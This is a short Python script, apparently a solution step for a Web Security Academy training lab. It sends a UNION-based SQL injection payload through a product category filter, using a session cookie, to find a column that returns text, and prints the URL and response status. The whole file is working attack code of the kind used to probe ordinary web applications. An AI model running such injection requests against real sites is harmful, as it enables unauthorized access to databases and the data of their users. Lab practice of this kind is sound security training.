#!/usr/bin/env python3

import urllib.parse
import requests

link = "https://ac011faf1fa5d769c0c04a4700bd0074.web-security-academy.net/filter?category=Accessories"
chunk = "' UNION SELECT NULL,'a',NULL--"
url = link + urllib.parse.quote(chunk)

payload={}
headers = {
  'Cookie': 'session=QFh6RDtA7iySFPtseZpOtCgBlurku4ok'
}

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
